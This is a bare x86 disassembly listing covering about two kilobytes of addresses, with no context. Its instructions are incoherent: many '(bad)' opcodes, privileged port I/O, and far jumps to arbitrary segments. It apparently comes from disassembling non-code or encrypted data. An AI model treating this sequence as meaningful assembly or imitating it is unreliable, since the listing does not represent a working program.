  411fbf:	es imul ebx,esp,0x711bcdc5
  411fc6:	idiv   cl
  411fc8:	in     al,dx
  411fc9:	cld    
  411fca:	into   
  411fcb:	xor    ebp,ebp
  411fcd:	hlt    
  411fce:	and    al,0xb0
  411fd0:	mov    ebx,DWORD PTR [ebx]
  411fd2:	mov    ebx,0xd1879c0b
  411fd7:	and    DWORD PTR [ecx+0x74],ebp
  411fda:	int    0xe3
  411fdc:	push   eax
  411fdd:	nop
  411fde:	test   eax,0x8fa699cf
  411fe3:	popf   
  411fe4:	(bad)  
  411fe6:	push   eax
  411fe7:	mov    ecx,DWORD PTR [ebx+ecx*8-0x762c5fde]
  411fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fef:	dec    ebp
  411ff0:	addr16 icebp 
  411ff2:	jbe    0x41206b
  411ff4:	mov    dh,0x39
  411ff6:	and    eax,0x6d4fb471
  411ffb:	add    DWORD PTR [ecx],esp
  411ffd:	out    dx,eax
  411ffe:	sub    al,0x22
  412000:	pop    ebp
  412001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412002:	retf   0x378
  412005:	ss out 0xe0,al
  412008:	test   DWORD PTR [ebp+0x2c],ebx
  41200b:	out    dx,eax
  41200c:	(bad)  
  41200d:	stos   DWORD PTR es:[edi],eax
  41200e:	mov    ah,BYTE PTR [ebp-0x19]
  412011:	sbb    DWORD PTR [ebp*2+0x59f85d33],0xcb639af0
  41201c:	pushf  
  41201d:	pop    esp
  41201e:	push   ebp
  41201f:	jp     0x412083
  412021:	aad    0x59
  412023:	jge    0x412009
  412025:	or     bl,BYTE PTR [edx+0x22]
  412028:	push   edx
  412029:	sbb    esi,ebp
  41202b:	mov    al,0x13
  41202d:	and    edi,DWORD PTR [edx]
  41202f:	and    al,al
  412031:	xor    eax,0xcc5e804
  412036:	sub    eax,0x6fd512f3
  41203b:	sub    BYTE PTR [ecx],0x6b
  41203e:	rcl    dl,1
  412040:	mov    WORD PTR [ecx-0x4d],ds
  412043:	jns    0x412069
  412045:	(bad)  
  412046:	xor    DWORD PTR [edx+0x1e],esi
  412049:	in     al,0x27
  41204b:	or     bh,BYTE PTR [edi+ebp*2+0x7e1b1e66]
  412052:	bswap  edi
  412054:	aam    0x6a
  412056:	sub    edx,esi
  412058:	imul   esp,DWORD PTR [esi+0x3e],0xe971eb2d
  41205f:	sbb    dl,BYTE PTR [ecx]
  412061:	or     DWORD PTR [ebp-0x2d],esp
  412064:	or     DWORD PTR [ebx-0x57c67259],0xffffffe6
  41206b:	sbb    DWORD PTR [edx-0x176e52b],0x65
  412072:	dec    eax
  412073:	icebp  
  412074:	loop   0x4120c9
  412076:	stos   DWORD PTR es:[edi],eax
  412077:	and    eax,0x591b9f6
  41207c:	inc    ebp
  41207d:	push   ss
  41207e:	push   ss
  41207f:	mov    esp,0x1fc6386b
  412084:	and    eax,0x928a0895
  412089:	shl    BYTE PTR [edx],cl
  41208b:	cmp    al,0x54
  41208d:	ror    BYTE PTR [ebp-0x2ccd9d1d],cl
  412093:	mov    al,0xb7
  412095:	push   esi
  412096:	dec    ebp
  412097:	test   DWORD PTR [esi],ebp
  412099:	inc    ebx
  41209a:	inc    ebp
  41209b:	and    eax,0xf12661b7
  4120a0:	into   
  4120a1:	outs   dx,DWORD PTR ds:[esi]
  4120a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a3:	gs jns 0x4120a5
  4120a6:	aam    0x79
  4120a8:	and    eax,0x1ad39539
  4120ad:	cmp    eax,0xce6b1b52
  4120b2:	retf   0x79
  4120b5:	ja     0x4120f2
  4120b7:	cwde   
  4120b8:	xor    edx,DWORD PTR [eax+0x56]
  4120bb:	jae    0x4120d0
  4120bd:	and    eax,0xef586036
  4120c2:	jnp    0x4120de
  4120c4:	pop    edx
  4120c5:	sub    al,0x88
  4120c7:	into   
  4120c8:	mov    bh,0xda
  4120ca:	ret    
  4120cb:	sub    DWORD PTR [esi+0x2e],0x232af321
  4120d2:	lahf   
  4120d3:	ins    BYTE PTR es:[edi],dx
  4120d4:	fild   WORD PTR [ebx]
  4120d6:	(bad)  
  4120d8:	repz imul ebx,DWORD PTR [esp+edi*2-0x8],0xffffffdb
  4120de:	into   
  4120df:	xchg   ebp,eax
  4120e0:	int3   
  4120e1:	hlt    
  4120e2:	test   esp,ebx
  4120e4:	shl    BYTE PTR [ecx-0x5e9a3183],cl
  4120ea:	push   ds
  4120eb:	jl     0x41211c
  4120ed:	and    esi,DWORD PTR [ecx+ecx*8+0x2e]
  4120f1:	inc    edi
  4120f2:	das    
  4120f3:	ds int 0x61
  4120f6:	mov    edx,0x2b51afef
  4120fb:	pop    esi
  4120fc:	push   0xec1e1293
  412101:	cmp    DWORD PTR [esi+esi*2-0x6c],edx
  412105:	std    
  412106:	or     cl,BYTE PTR [ebp+0x53]
  412109:	fiadd  WORD PTR [esi-0x11]
  41210c:	pop    ds
  41210d:	pop    edi
  41210e:	lea    ecx,[esp+eiz*4+0x1d678cfb]
  412115:	sbb    eax,0x10ea1462
  41211a:	xor    edx,DWORD PTR [edi-0x51]
  41211d:	and    al,0xfe
  41211f:	ins    DWORD PTR es:[edi],dx
  412120:	int3   
  412121:	push   ebx
  412122:	mov    bh,0xdc
  412124:	icebp  
  412125:	mov    edx,0x7987da1c
  41212a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212b:	sub    al,BYTE PTR [ecx+0x28]
  41212e:	jg     0x412173
  412130:	les    ecx,FWORD PTR [eax+0x3d]
  412133:	retf   0x5975
  412136:	cdq    
  412137:	stc    
  412138:	rcr    DWORD PTR [esi],cl
  41213a:	(bad)  
  41213b:	pop    esp
  41213c:	push   ds
  41213d:	cmp    edi,DWORD PTR [esi+0x4b]
  412140:	popa   
  412141:	fsubp  st(4),st
  412143:	add    eax,0x93159a97
  412148:	add    eax,0x78f415e7
  41214d:	or     esi,ecx
  41214f:	sub    ecx,edx
  412151:	bound  edx,QWORD PTR [eax-0x23]
  412154:	popf   
  412155:	out    dx,eax
  412156:	cmp    eax,0xa114dbe2
  41215b:	stos   BYTE PTR es:[edi],al
  41215c:	mov    ds:0x34059d43,eax
  412161:	(bad)  
  412162:	mov    al,ds:0x4bca4487
  412167:	pop    ebp
  412168:	sbb    eax,0x235885d6
  41216d:	int3   
  41216e:	(bad)  
  41216f:	mov    eax,ds:0x5c67e790
  412174:	icebp  
  412175:	xchg   ebp,eax
  412176:	jns    0x41210d
  412178:	pop    ds
  412179:	or     BYTE PTR [esi+0x70],dh
  41217c:	sahf   
  41217d:	mov    cl,0x75
  41217f:	mov    eax,0x112d8633
  412184:	(bad)  [eax]
  412186:	mov    esp,0xe81eba53
  41218b:	sub    al,0x89
  41218d:	in     eax,0x8
  41218f:	pop    ss
  412190:	retf   0x744c
  412193:	push   0x55
  412195:	test   BYTE PTR [esi+ebx*4],dh
  412198:	adc    ah,dl
  41219a:	push   edi
  41219b:	or     eax,0xcfb68bf4
  4121a0:	dec    ecx
  4121a1:	loop   0x412221
  4121a3:	sbb    al,0xad
  4121a5:	daa    
  4121a6:	imul   eax,DWORD PTR [edi+0x7834df5b],0x68
  4121ad:	ret    
  4121ae:	aaa    
  4121af:	mov    ebp,0x61ef6b40
  4121b4:	adc    BYTE PTR [ecx+eiz*1+0x6c],ah
  4121b8:	ret    0x64b0
  4121bb:	repnz xchg edi,eax
  4121bd:	mov    dh,0x9
  4121bf:	loop   0x41218f
  4121c1:	(bad)  
  4121c2:	ja     0x4121ba
  4121c4:	in     eax,0xee
  4121c6:	inc    edx
  4121c7:	mov    ebx,0x1a74ee3d
  4121cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121cd:	add    eax,0xd6e19b6e
  4121d2:	jl     0x412209
  4121d4:	cdq    
  4121d5:	dec    ecx
  4121d6:	sbb    eax,0x2f482a4e
  4121db:	loopne 0x4121c7
  4121dd:	loopne 0x41221b
  4121df:	(bad)  [ebp+0x67810b5c]
  4121e5:	out    dx,al
  4121e6:	mov    eax,0x31925db7
  4121eb:	jge    0x4121ed
  4121ed:	lods   al,BYTE PTR ds:[esi]
  4121ee:	int3   
  4121ef:	and    DWORD PTR [eax-0x16],eax
  4121f2:	xor    DWORD PTR [ebp-0xf],0x45c7e3a6
  4121f9:	aas    
  4121fa:	inc    ebp
  4121fb:	test   al,0xfe
  4121fd:	add    DWORD PTR [ecx],edx
  4121ff:	push   edi
  412200:	in     eax,dx
  412201:	loop   0x4121fb
  412203:	add    BYTE PTR [esi],ah
  412205:	pop    eax
  412206:	push   cs
  412207:	enter  0xdb93,0x23
  41220b:	sbb    ah,BYTE PTR [eax+edx*4]
  41220e:	enter  0x5bd6,0x19
  412212:	adc    al,0x3
  412214:	cli    
  412215:	mov    ecx,0xdbe789d8
  41221a:	mov    edx,0x538802d9
  41221f:	stc    
  412220:	mov    eax,0x399ec733
  412225:	dec    eax
  412226:	jae    0x41228a
  412228:	jns    0x412269
  41222a:	stc    
  41222b:	dec    ecx
  41222c:	int    0xf7
  41222e:	leave  
  41222f:	cmp    ebx,DWORD PTR [edx+0x2e17619c]
  412235:	lahf   
  412236:	mov    ebp,DWORD PTR [ebx+0x4fd444e8]
  41223c:	ret    
  41223d:	sub    esi,ebp
  41223f:	(bad)  
  412240:	stos   BYTE PTR es:[edi],al
  412241:	xor    eax,0xf5432092
  412246:	outs   dx,DWORD PTR ds:[esi]
  412247:	in     al,0x68
  412249:	pop    edx
  41224a:	mov    al,0x26
  41224c:	loopne 0x41222b
  41224e:	adc    dh,BYTE PTR [ebx]
  412250:	xchg   esi,eax
  412251:	push   esi
  412252:	div    DWORD PTR [ecx+edi*4]
  412255:	xlat   BYTE PTR ds:[ebx]
  412256:	dec    esp
  412257:	cmp    bh,0xf9
  41225a:	jmp    0x284b:0xd34de856
  412261:	aad    0x3c
  412263:	jl     0x41225c
  412265:	mov    ds:0x7e47a719,al
  41226a:	or     DWORD PTR ds:0xea3bbcb5,0x5bccb72e
  412274:	ret    0xe643
  412277:	shl    dh,1
  412279:	push   ebx
  41227a:	repnz pop ss
  41227c:	pop    edx
  41227d:	lods   al,BYTE PTR ds:[esi]
  41227e:	mov    bh,0xcc
  412280:	sbb    ecx,DWORD PTR [ecx+0x10]
  412283:	ret    
  412284:	mov    bh,0xc8
  412286:	cmp    eax,ecx
  412288:	ret    0xb0d5
  41228b:	stos   DWORD PTR es:[edi],eax
  41228c:	ins    DWORD PTR es:[edi],dx
  41228d:	xor    dh,BYTE PTR [edx-0x24]
  412290:	sbb    dh,bh
  412292:	or     eax,DWORD PTR [esi]
  412294:	ins    BYTE PTR es:[edi],dx
  412295:	or     eax,DWORD PTR [edx]
  412297:	outs   dx,DWORD PTR ds:[esi]
  412298:	ins    DWORD PTR es:[edi],dx
  412299:	cmp    BYTE PTR [ebp+0xa],0x9d
  41229d:	aas    
  41229e:	faddp  st(1),st
  4122a0:	data16 std 
  4122a2:	xchg   esp,eax
  4122a3:	sub    al,0xe0
  4122a5:	jnp    0x412289
  4122a7:	jp     0x41231d
  4122a9:	sub    ch,bh
  4122ab:	(bad)  
  4122ac:	mov    eax,0x47d342f3
  4122b1:	push   eax
  4122b2:	adc    BYTE PTR [ebx-0x74],bl
  4122b5:	or     eax,DWORD PTR [edi]
  4122b7:	xlat   BYTE PTR ds:[ebx]
  4122b8:	mov    bh,0x7b
  4122ba:	jb     0x412259
  4122bc:	leave  
  4122bd:	mov    ch,0xd6
  4122bf:	lahf   
  4122c0:	test   eax,0xd73264b2
  4122c5:	inc    ecx
  4122c6:	mov    bh,0x76
  4122c8:	mov    ch,0xec
  4122ca:	and    bl,BYTE PTR [ecx]
  4122cc:	xor    eax,0xcd1fa2cf
  4122d1:	(bad)  
  4122d2:	mov    ds:0x13b26e44,al
  4122d7:	(bad)  
  4122d9:	cmp    edx,DWORD PTR [edi]
  4122db:	(bad)  
  4122dc:	ror    ch,1
  4122de:	jb     0x4122c4
  4122e0:	ja     0x4122a4
  4122e2:	sub    al,BYTE PTR ds:[edx-0x180a7135]
  4122e9:	jno    0x4122a5
  4122eb:	adc    eax,0x889171a
  4122f0:	ins    DWORD PTR es:[edi],dx
  4122f1:	sub    dl,BYTE PTR [edx-0x1d756019]
  4122f7:	sbb    BYTE PTR [esi-0x29],cl
  4122fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122fb:	or     dl,BYTE PTR [edx-0x311dd0f1]
  412301:	jne    0x4122ac
  412303:	jbe    0x412305
  412305:	dec    ecx
  412306:	sahf   
  412307:	aam    0xa4
  412309:	push   esi
  41230a:	(bad)  
  41230b:	ret    0x91bb
  41230e:	dec    ebx
  41230f:	mov    esp,0x1b3e0d68
  412314:	sub    BYTE PTR [ebx],0xd
  412317:	daa    
  412318:	push   cs
  412319:	(bad)  
  41231a:	into   
  41231b:	call   0x5d30:0x52557180
  412322:	inc    ebx
  412323:	repnz inc esi
  412325:	dec    sp
  412327:	shr    BYTE PTR [edi-0x5e26c5c],cl
  41232d:	ss jp  0x41238f
  412330:	mov    ch,0x45
  412332:	popa   
  412333:	xor    eax,0x9eebb57a
  412338:	add    eax,0x9a9c2123
  41233d:	sub    eax,0xf1c18b74
  412342:	aaa    
  412343:	(bad)  
  412345:	call   0x697b014c
  41234a:	add    BYTE PTR [eax],al
  41234c:	int3   
  41234d:	add    al,0xc7
  41234f:	out    0x30,eax
  412351:	sub    BYTE PTR [ecx-0x70],bh
  412354:	fldpi  
  412356:	jge    0x41233a
  412358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412359:	sub    esp,DWORD PTR [edx+0x3a]
  41235c:	mov    esp,0xc8674ec9
  412361:	aam    0xf9
  412363:	and    BYTE PTR [edx],cl
  412365:	outs   dx,DWORD PTR ds:[esi]
  412366:	rol    DWORD PTR [ebp-0x69],1
  412369:	push   0xffffffe5
  41236b:	jecxz  0x4122f9
  41236d:	pop    eax
  41236e:	cmp    edx,ecx
  412370:	fsub   QWORD PTR [eax-0x7d]
  412373:	and    BYTE PTR [ebx],dh
  412375:	icebp  
  412376:	add    dl,BYTE PTR gs:[ebx-0x9]
  41237a:	push   esp
  41237b:	in     eax,dx
  41237c:	popf   
  41237d:	pop    ss
  41237e:	(bad)  
  41237f:	mov    bl,0x48
  412381:	jne    0x412309
  412383:	jmp    0x87e7ae82
  412388:	mov    cl,0x4b
  41238a:	mov    al,ds:0x3e71e4dd
  41238f:	imul   ebx,DWORD PTR [edx],0xf89278f
  412395:	inc    ecx
  412396:	fwait
  412397:	jbe    0x41234d
  412399:	and    eax,0x5f7b44a9
  41239e:	push   esp
  41239f:	(bad)  
  4123a0:	out    dx,eax
  4123a1:	pop    ebx
  4123a2:	xor    ecx,DWORD PTR [ecx-0x75dcfd3b]
  4123a8:	stos   DWORD PTR es:[edi],eax
  4123a9:	test   al,0x27
  4123ab:	push   es
  4123ac:	and    eax,0x7d198343
  4123b1:	xor    DWORD PTR [eax+edi*2-0x78],ebx
  4123b5:	xor    eax,0x645fa4db
  4123ba:	ficomp WORD PTR [ebx+0x4a]
  4123bd:	mov    BYTE PTR [ecx+0x14],bh
  4123c0:	xchg   edi,eax
  4123c1:	gs jle 0x41237c
  4123c4:	xchg   edi,eax
  4123c5:	mov    eax,0x9993c480
  4123ca:	jmp    0x7d63:0xd70b6ab9
  4123d1:	jmp    0xea0edca8
  4123d6:	call   DWORD PTR [ecx]
  4123d8:	shl    edx,1
  4123da:	mov    bl,0xb
  4123dc:	scas   eax,DWORD PTR es:[edi]
  4123dd:	lea    edx,[edi]
  4123df:	imul   ebx,DWORD PTR [edi-0x13a640e5],0x9f0602be
  4123e9:	jns    0x41243c
  4123eb:	sub    eax,DWORD PTR [eax]
  4123ed:	jle    0x4123d9
  4123ef:	and    esi,ecx
  4123f1:	addr16 pop ss
  4123f3:	cs mov dl,ah
  4123f6:	fldenv [ebx+0x3a58f9e2]
  4123fc:	jmp    0x412404
  4123fe:	aam    0x5c
  412400:	pop    es
  412401:	std    
  412402:	pop    ecx
  412403:	jae    0x412426
  412405:	cs mov al,0xd2
  412408:	out    dx,al
  412409:	pop    ecx
  41240a:	out    0xcb,al
  41240c:	icebp  
  41240d:	shr    BYTE PTR cs:[eax+0x72244eec],0xd3
  412415:	retf   
  412416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412417:	scas   eax,DWORD PTR es:[edi]
  412418:	sbb    al,0xb5
  41241a:	test   al,0x6a
  41241c:	mov    esp,0xfeb86aa4
  412421:	adc    ecx,DWORD PTR [edx-0x67]
  412424:	jo     0x41249e
  412426:	pop    ebx
  412427:	shr    BYTE PTR [esp+eiz*8+0x70f81244],1
  41242e:	in     eax,0xf7
  412430:	fnstenv [edi-0x190369d6]
  412436:	lahf   
  412437:	call   0x9406:0xbef3ca5f
  41243e:	jg     0x41241f
  412440:	stos   DWORD PTR es:[edi],eax
  412441:	pop    ss
  412442:	sbb    BYTE PTR [edi+0x1f],dl
  412445:	jmp    0xdc3b5a95
  41244a:	jo     0x41241f
  41244c:	xchg   esi,eax
  41244d:	aaa    
  41244e:	mov    WORD PTR [esi-0x4683e643],gs
  412454:	rcr    edi,cl
  412456:	inc    eax
  412457:	(bad)  
  41245a:	loope  0x4123ec
  41245c:	(bad)  
  41245e:	aaa    
  41245f:	pusha  
  412460:	adc    BYTE PTR [esi-0x42756acc],dh
  412466:	icebp  
  412467:	aad    0xb
  412469:	and    cl,BYTE PTR [edx]
  41246b:	fisub  WORD PTR [edi-0x32]
  41246e:	aam    0x75
  412470:	int3   
  412471:	and    ah,BYTE PTR [eax]
  412473:	adc    dl,BYTE PTR [ecx+eiz*2-0x78]
  412477:	fld    TBYTE PTR [ecx+0x9]
  41247a:	push   ecx
  41247b:	aas    
  41247c:	cwde   
  41247d:	sub    al,BYTE PTR es:0x949c8563
  412484:	cwde   
  412485:	pop    es
  412486:	cdq    
  412487:	mov    BYTE PTR [ecx+0x63],cl
  41248a:	dec    ebp
  41248b:	mov    ah,0x8f
  41248d:	mov    esp,0xa4c17328
  412492:	adc    eax,0x43394a80
  412497:	loope  0x4124f0
  412499:	sub    cl,ah
  41249b:	inc    esp
  41249c:	iret   
  41249d:	loopne 0x4124d9
  41249f:	das    
  4124a0:	push   ecx
  4124a1:	xchg   ebp,eax
  4124a2:	fld    DWORD PTR [ecx+0x745bf126]
  4124a8:	aam    0x93
  4124aa:	pop    ecx
  4124ab:	arpl   WORD PTR [ecx-0x6414e173],si
  4124b1:	arpl   WORD PTR [ebx+0x2f],bx
  4124b4:	lock cdq 
  4124b6:	sub    al,0x64
  4124b8:	pushf  
  4124b9:	xchg   esi,eax
  4124ba:	out    0xef,al
  4124bc:	sbb    eax,0xef23ca8f
  4124c1:	dec    edx
  4124c2:	data16 das 
  4124c4:	mov    esp,0x3b843ef
  4124c9:	aad    0xd7
  4124cb:	or     DWORD PTR [ecx+0x143fbee2],0x39f4ac45
  4124d5:	ins    DWORD PTR es:[edi],dx
  4124d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124d7:	pop    eax
  4124d8:	sub    eax,0xbec08062
  4124dd:	in     eax,0xaa
  4124df:	sbb    DWORD PTR [esi+0x7],ecx
  4124e2:	jmp    0x412493
  4124e4:	das    
  4124e5:	sub    eax,0x15052003
  4124ea:	mov    dl,0x80
  4124ec:	aas    
  4124ed:	pop    edi
  4124ee:	rol    DWORD PTR [edx],cl
  4124f0:	inc    ebp
  4124f1:	inc    al
  4124f3:	sub    bl,BYTE PTR [edi-0x51]
  4124f6:	dec    edi
  4124f7:	push   ds
  4124f8:	idiv   BYTE PTR [edi+edi*2-0x2925ac1b]
  4124ff:	xor    DWORD PTR [eax-0x334b3b],ecx
  412505:	fisub  WORD PTR [eax]
  412507:	dec    ebp
  412508:	sbb    eax,0x5840c9ba
  41250d:	pop    ecx
  41250e:	and    DWORD PTR [esi+edi*4],ebx
  412511:	fisttp QWORD PTR [ebp+0x1914b908]
  412517:	adc    eax,0x89c5a908
  41251c:	jp     0x412556
  41251e:	(bad)  
  412520:	aas    
  412521:	push   esp
  412522:	pop    eax
  412523:	sub    bl,BYTE PTR [ebp-0x39]
  412526:	fiadd  WORD PTR [edi]
  412528:	fld    DWORD PTR [ebx+0xf]
  41252b:	sysret 
  41252d:	adc    DWORD PTR [eax+0x8],ecx
  412530:	sahf   
  412531:	jns    0x412567
  412533:	inc    edi
  412534:	jns    0x4124cb
  412536:	outs   dx,DWORD PTR ds:[esi]
  412537:	inc    edi
  412538:	mov    bl,0x0
  41253a:	movhps xmm1,QWORD PTR [edi-0x4f1a3410]
  412541:	nop
  412542:	ret    0x20a1
  412545:	ds jle 0x4124f1
  412548:	or     eax,eax
  41254a:	outs   dx,DWORD PTR ds:[esi]
  41254b:	retf   
  41254c:	ins    BYTE PTR es:[edi],dx
  41254d:	pop    ss
  41254e:	nop
  41254f:	stos   BYTE PTR es:[edi],al
  412550:	mov    esp,DWORD PTR [eax+0x6e]
  412553:	jmp    0x4125cd
  412555:	daa    
  412556:	mov    esi,0x31197274
  41255b:	rcr    esi,0x79
  41255e:	mov    WORD PTR [edi+ebx*4],ss
  412561:	push   cs
  412562:	add    al,0xae
  412564:	jae    0x4125b3
  412566:	test   eax,0xdfe0d44a
  41256b:	in     al,0x3e
  41256d:	daa    
  41256e:	or     DWORD PTR [edi+eax*2-0x2d],esi
  412572:	retf   0xab9c
  412575:	jb     0x412504
  412577:	in     eax,0x1c
  412579:	add    eax,0xc72dfb7f
  41257e:	xor    eax,0xa1ab1057
  412583:	sub    al,0x55
  412585:	pop    ecx
  412586:	jae    0x412531
  412588:	mov    esi,ebx
  41258a:	pop    edx
  41258b:	xor    al,0xb2
  41258d:	stc    
  41258e:	mov    eax,0x244d6dfd
  412593:	sub    DWORD PTR [ebx+0x5c452740],ebx
  412599:	sbb    bl,BYTE PTR [edi+0x42]
  41259c:	bound  ebx,QWORD PTR [esi+edi*1-0x1c]
  4125a0:	rcr    DWORD PTR [ebx-0x38444b60],cl
  4125a6:	inc    esi
  4125a7:	loope  0x412584
  4125a9:	aas    
  4125aa:	push   ebx
  4125ab:	push   ecx
  4125ac:	call   0x7372def6
  4125b1:	sub    al,0x80
  4125b3:	(bad)  
  4125b4:	sar    DWORD PTR [eax],cl
  4125b6:	test   eax,0x4c80865b
  4125bb:	adc    dh,ah
  4125bd:	push   0xcec6b1f2
  4125c2:	sar    BYTE PTR [eax],1
  4125c4:	cmp    cl,BYTE PTR [ebx]
  4125c6:	cli    
  4125c7:	xor    eax,0xd484987a
  4125cc:	inc    esi
  4125cd:	xor    DWORD PTR [eax+0xe0886fa],esi
  4125d3:	(bad)  
  4125d5:	clc    
  4125d6:	data16 sahf 
  4125d8:	ins    BYTE PTR es:[edi],dx
  4125d9:	and    al,0xc6
  4125db:	or     BYTE PTR [ecx+0x2d],0xdc
  4125df:	gs enter 0xd291,0x42
  4125e4:	(bad)  
  4125e5:	mov    ebp,0xa414578a
  4125ea:	fwait
  4125eb:	mov    BYTE PTR [edx-0x3ea21e08],ch
  4125f1:	cmp    dl,BYTE PTR [ebx]
  4125f3:	fmul   DWORD PTR [ebx+ecx*2]
  4125f6:	mov    cl,0xa5
  4125f8:	and    dl,bl
  4125fa:	mov    WORD PTR [edx],es
  4125fc:	cwde   
  4125fd:	push   ebp
  4125fe:	shl    ecx,0xb0
  412601:	add    dl,BYTE PTR [ecx-0x2d]
  412604:	jecxz  0x412624
  412606:	imul   edx,eax,0xffffffc2
  412609:	(bad)  
  41260a:	sbb    BYTE PTR [edi+0x79],cl
  41260d:	pop    es
  41260e:	adc    al,0xaf
  412610:	xchg   DWORD PTR ds:0xa056f87b,ebp
  412616:	push   es
  412617:	out    dx,al
  412618:	push   edx
  412619:	cmp    BYTE PTR [ebx+0x7d468ce7],ch
  41261f:	and    dl,al
  412621:	xchg   ebp,eax
  412622:	test   BYTE PTR ss:[ebx-0x70],dl
  412626:	mov    ecx,0xd4e58b76
  41262b:	ds mov ah,0xf2
  41262e:	mov    cs,ebx
  412630:	(bad)  
  412631:	dec    eax
  412632:	inc    edi
  412633:	jb     0x412607
  412635:	in     al,dx
  412636:	pop    eax
  412637:	sti    
  412638:	inc    ebx
  412639:	(bad)  
  41263a:	sbb    al,0x55
  41263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41263d:	pop    esi
  41263e:	int3   
  41263f:	mov    dh,0x4f
  412641:	mov    BYTE PTR [esp+eax*4],dh
  412644:	cwde   
  412645:	cld    
  412646:	ds cs push edi
  412649:	xchg   ebp,eax
  41264a:	sbb    DWORD PTR [edi-0x70f0f926],ecx
  412650:	mov    ch,0x7f
  412652:	test   DWORD PTR [ebp-0x15],ebx
  412655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412656:	xor    ebx,DWORD PTR [eax-0x76]
  412659:	mov    bl,0xbe
  41265b:	sbb    ecx,DWORD PTR [esi+0x25c6f4fa]
  412661:	add    BYTE PTR [ecx-0x4a49a7b6],0xe4
  412668:	icebp  
  412669:	int    0xf3
  41266b:	out    dx,eax
  41266c:	mov    esi,DWORD PTR ds:0x244bfdf1
  412672:	fimul  WORD PTR [ebp+0x4b]
  412675:	xor    esp,DWORD PTR [esi+0x3f]
  412678:	pop    ebp
  412679:	push   eax
  41267a:	mov    ch,0x5a
  41267c:	dec    edx
  41267d:	shl    BYTE PTR [ebp-0x4d],0x14
  412681:	sti    
  412682:	pop    ds
  412683:	mov    ds:0x3070c7ca,eax
  412688:	push   ebx
  412689:	and    BYTE PTR [esi+edx*8+0x60b258e1],0x1e
  412691:	jb     0x4126b6
  412693:	or     al,0xfb
  412695:	pop    edi
  412696:	sbb    bl,bl
  412698:	jg     0x412625
  41269a:	adc    al,0x10
  41269c:	imul   edi,DWORD PTR [edx],0x69fa2cee
  4126a2:	call   0x190a:0xb0f46818
  4126a9:	jae    0x41268f
  4126ab:	and    cl,BYTE PTR [ebx+0x113718aa]
  4126b1:	fs jecxz 0x4126e8
  4126b4:	das    
  4126b5:	test   al,0x43
  4126b7:	jmp    0xcdc6d8da
  4126bc:	rcl    DWORD PTR [ebp+0x3330871b],1
  4126c2:	scas   al,BYTE PTR es:[edi]
  4126c3:	sbb    al,0xe6
  4126c5:	mov    edx,esp
  4126c7:	ja     0x412682
  4126c9:	inc    edx
  4126ca:	cld    
  4126cb:	loop   0x412747
  4126cd:	shl    BYTE PTR [eax+0x1662d4f],cl
  4126d3:	dec    esp
  4126d4:	(bad)  
  4126d5:	icebp  
  4126d6:	push   0x3d
  4126d8:	and    al,BYTE PTR [eax+0x59]
  4126db:	aam    0x3b
  4126dd:	pop    esi
  4126de:	and    DWORD PTR [esi-0x2f],edi
  4126e1:	call   0x17c8ea0f
  4126e6:	imul   esp,ebx,0xffffffee
  4126e9:	pushf  
  4126ea:	popf   
  4126eb:	xchg   edi,eax
  4126ec:	fcomip st,st(2)
  4126ee:	or     BYTE PTR [ecx+edi*1+0x22278e14],bl
  4126f5:	and    eax,0x5f70870b
  4126fa:	or     eax,0xecc046d
  4126ff:	shl    DWORD PTR [esi-0x4416ac3],1
  412705:	sbb    DWORD PTR [esi-0x5d35a781],ecx
  41270b:	retf   
  41270c:	sbb    sp,WORD PTR [ebx]
  41270f:	adc    al,0x27
  412711:	popa   
  412712:	lahf   
  412713:	repnz dec edi
  412715:	sar    DWORD PTR [edi+eax*8+0x6c],cl
  412719:	push   edx
  41271a:	jo     0x412777
  41271c:	xor    dh,BYTE PTR [eax+0x256076cc]
  412722:	pop    ds
  412723:	dec    edx
  412724:	lahf   
  412725:	push   ecx
  412726:	rol    DWORD PTR [ecx+0xc7f9be],1
  41272c:	mov    cl,0x13
  41272e:	les    esp,FWORD PTR [eax]
  412730:	add    al,0xca
  412732:	loope  0x41271c
  412734:	and    BYTE PTR [eax+0x76f85c04],ch
  41273a:	clc    
  41273b:	shl    BYTE PTR [esi+eax*4],cl
  41273e:	data16 cli 
  412740:	retf   0x9825
  412743:	jne    0x4127a1
  412745:	cmp    eax,0x6e226bef
  41274a:	cmp    eax,ecx
  41274c:	jp     0x412708
  41274e:	dec    edi
  41274f:	sbb    BYTE PTR [ebx],ah
  412751:	test   eax,0xce0ae2dc
  412756:	stos   DWORD PTR es:[edi],eax
  412757:	in     al,0xa9
  412759:	pop    edi
  41275a:	popf   
  41275b:	jb     0x4127ae
  41275d:	pop    esi
  41275e:	push   cs
  41275f:	jle    0x4126f8
  412761:	aaa    
  412762:	aam    0x37
  412764:	cwde   
  412765:	adc    al,0x1b
  412767:	clc    
  412768:	icebp  
  412769:	inc    ebx
  41276a:	fst    QWORD PTR [eax]
  41276c:	add    esi,DWORD PTR [edx-0x68]
  41276f:	stos   BYTE PTR es:[edi],al
  412770:	not    edi
  412772:	arpl   WORD PTR [edx-0x1e],cx
  412775:	mov    eax,0xba8c2ac0
  41277a:	ja     0x412712
  41277c:	mov    cs,edi
  41277e:	sub    al,0x36
  412780:	sub    al,0x20
  412782:	jp     0x412711
  412784:	jmp    0x412730
  412786:	clc    
  412787:	xchg   ebx,eax
  412788:	sbb    esi,DWORD PTR ds:0x34e11261
  41278e:	fist   WORD PTR [esi-0x4b]
  412791:	xor    eax,0xcce4a1bd
  412796:	sbb    al,ch
  412798:	and    eax,0x54faecf
  41279d:	xor    esp,DWORD PTR [edi]
  41279f:	shl    BYTE PTR [ecx],cl
  4127a1:	and    eax,0xf50aed76
  4127a6:	cdq    
  4127a7:	push   ebx
  4127a8:	and    dh,0xac
  4127ab:	shl    BYTE PTR [edi+esi*8-0x68],0xa1
  4127b0:	dec    eax
  4127b1:	and    DWORD PTR [edi+0x5d],ebx
  4127b4:	jl     0x4127b7
